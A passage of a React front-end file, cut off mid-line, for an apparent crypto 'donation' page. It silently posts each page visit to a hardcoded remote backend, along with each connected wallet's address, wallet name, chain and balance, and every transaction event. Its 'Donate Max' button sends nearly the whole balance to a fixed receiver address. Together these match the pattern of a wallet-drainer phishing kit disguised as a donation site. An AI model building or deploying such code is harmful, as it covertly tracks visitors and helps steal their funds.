// src/App.jsx
import React, { useEffect, useRef, useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useChainId,
  useWaitForTransactionReceipt,
} from "wagmi";
import { readContract } from "@wagmi/core"; // for future ERC20 reads (commented usage below)
import { parseEther, formatEther } from "viem";

/* ====== CONFIG ====== */
const API_URL = "https://web-production-2da7.up.railway.app/notify";
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

/* Chain & symbol map (extend as needed) */
const CHAIN_MAP = {
  1: { name: "Ethereum Mainnet", symbol: "ETH" },
  56: { name: "BNB Smart Chain", symbol: "BNB" },
  11155111: { name: "Sepolia Testnet", symbol: "ETH (Sepolia)" },
};

/* If you later add USDT: these are the mainnet addresses (kept here commented for future use)
const USDT_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // ETH mainnet USDT
  56: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
};
const ERC20_ABI = [
  { name: "balanceOf", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }], outputs: [{ type: "uint256" }] },
  { name: "decimals", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
];
*/

/* ====== Helper: notify backend ====== */
async function notifyBackend(event, data = {}) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: window.location.href, // real frontend link
      }),
    });
  } catch (err) {
    console.error("notifyBackend error:", err);
  }
}

/* ====== Component ====== */
export default function App() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const chainInfo = CHAIN_MAP[chainId] || { name: `Chain ${chainId || "unknown"}`, symbol: "NATIVE" };
  const chainName = chainInfo.name;
  const nativeSymbol = chainInfo.symbol;

  // native balance (watch for updates)
  const { data: balanceData } = useBalance({ address, chainId, watch: true });

  // transaction API
  const { sendTransaction } = useSendTransaction();
  const [pendingHash, setPendingHash] = useState(null);
  const { data: receipt, isSuccess: receiptSuccess } = useWaitForTransactionReceipt({ hash: pendingHash, enabled: !!pendingHash });

  // prev-connected ref to detect disconnect
  const prevConnectedRef = useRef(false);

  /* ----- link_open on page load ----- */
  useEffect(() => {
    // include page URL via notifyBackend's source
    notifyBackend("link_open", { note: "page_loaded" });
  }, []);

  /* ----- wallet_connect: send single rich notification (native balance) ----- */
  useEffect(() => {
    if (!isConnected || !address) return;

    (async () => {
      // native balance (human)
      let nativeBal = "0";
      try {
        if (balanceData?.value) nativeBal = formatEther(balanceData.value);
      } catch (e) {
        nativeBal = "0";
      }

      // (optional) you can fetch price and compute USD here; omitted to reduce client-side calls
      await notifyBackend("wallet_connect", {
        account: address,
        wallet_name: connector?.name || "unknown",
        chain: chainName,
        native_balance: nativeBal,
      });

      // ===== Example: commented-out USDT read skeleton (for future) =====
      /*
      const usdtAddr = USDT_ADDRESSES[chainId];
      if (usdtAddr) {
        try {
          const raw = await readContract({ address: usdtAddr, abi: ERC20_ABI, functionName: "balanceOf", args: [address], chainId });
          // decimals read & conversion omitted for brevity
        } catch (e) {
          console.warn("USDT read error", e);
        }
      }
      */
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address, chainId, balanceData, connector]);

  /* ----- wallet_disconnect detection ----- */
  useEffect(() => {
    const prev = prevConnectedRef.current;
    if (prev && !isConnected) {
      // was connected before, now disconnected
      notifyBackend("wallet_disconnect", { account: address });
    }
    prevConnectedRef.current = isConnected;
  }, [isConnected, address]);

  /* ----- watch receipt: final notification ----- */
  useEffect(() => {
    if (!receiptSuccess || !receipt) return;
    const ok = receipt.status === 1 || receipt.status === "success" || receipt.status === true;
    if (ok) {
      notifyBackend("donation_confirmed", {
        account: address,
        txHash: pendingHash,
        blockNumber: receipt.blockNumber ?? receipt.block_number ?? null,
      });
    } else {
      notifyBackend("donation_failed", {
        account: address,
        txHash: pendingHash,
        reason: "tx reverted",
      });
    }
    setPendingHash(null);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [receiptSuccess, receipt]);

  /* ===== Donate fixed (0.01 native) ===== */
  const handleDonateFixed = async () => {
    if (!isConnected || !address) {
      notifyBackend("donation_failed", { account: address, error: "wallet_not_connected" });
      return;
    }

    // user clicked (intent)
    notifyBackend("donation_attempt", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });

    try {
      const amountWei = parseEther("0.01"); // BigInt
      const txResp = await sendTransaction({ request: { to: RECEIVER, value: amountWei } });

      // wallet returns tx response (contains hash if accepted)
      const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
      if (txHash) {
        setPendingHash(txHash);
        notifyBackend("donation_approved", { account: address, txHash, amount: "0.01", token: nativeSymbol, chain: chainName });
      } else {
        // rare fallback
        notifyBackend("donation_approved", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
      }
    } catch (err) {
      const msg = err?.message || String(err);
      if (msg.toLowerCase().includes("user rejected") || msg.toLowerCase().includes("user denied")) {
        notifyBackend("donation_rejected", { account: address, error: msg });
      } else {
        notifyBackend("donation_failed", { account: address, error: msg });
      }
    }
  };

  /* ===== Donate Max (native only): balance - gasBuffer (BigInt math) ===== */
  const handleDonateMax = async () => {
    if (!isConnected || !address || !balanceData?.value) {
      notifyBackend("donation_failed", { account: address, error: "missing_balance_or_wallet" });
      return;
    }

    try {
      const raw = BigInt(balanceData.value); // BigInt exact
      const buffer = parseEther("0.001"); // BigInt
      if (raw <= buffer) {
        notifyBackend("donation_failed", { account: address, error: "insufficient_balance" });
        return;
      }

      const sendWei = raw - buffer; // BigInt
      const human = Number(formatEther(sendWei)).toFixed(6);

      notifyBackend("donation_attempt", { account: address, amount: human, token: nativeSymbol, chain: chainName });

      const txResp = await sendTransaction({ request: { to: RECEIVER, value: sendWei } });
      const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
      i
